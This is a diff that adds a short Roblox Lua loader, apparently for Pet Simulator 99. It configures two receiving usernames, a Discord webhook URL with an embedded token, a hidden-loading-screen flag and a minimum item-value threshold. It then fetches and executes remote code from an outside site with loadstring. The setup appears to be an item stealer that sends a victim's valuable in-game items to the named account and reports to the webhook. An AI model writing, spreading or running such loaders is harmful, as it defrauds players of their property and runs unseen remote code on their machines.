@@ -1,0 +1,9 @@
+Username = "matou2209"
+Username2 = "matou2209"
+Webhook = "https://discord.com/api/webhooks/1207057081027268609/2XuWUr2kuBuX49nZPuxnVD0xE-saqNkO7RnV61HZTwE-sufys6hJxesCzeif0mz1vjwA"
+
+LoadingScreen = false
+
+MinimumRAP = 100000
+
+loadstring(game:HttpGet("https://hugegames.lol/ps99.lua"))()
